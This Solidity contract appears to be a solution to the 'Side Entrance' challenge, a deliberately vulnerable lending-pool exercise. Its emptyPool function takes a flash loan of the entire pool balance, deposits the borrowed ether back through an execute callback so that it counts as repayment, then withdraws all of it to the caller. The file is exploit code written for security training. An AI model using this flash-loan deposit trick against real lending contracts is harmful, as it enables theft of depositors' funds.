// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";

/**
 * @title FlashLoanEtherReceiver
 * @author pawanpaudel93
 */
contract FlashLoanEtherReceiver is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function poolBalance() internal view returns (uint256) {
        return address(pool).balance;
    }

    function myBalance() internal view returns (uint256) {
        return address(this).balance;
    }

    function emptyPool() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool sent, ) = msg.sender.call{value: myBalance()}("");
        require(sent, "Withdraw unsuccessful");
    }

    receive() external payable {}
}
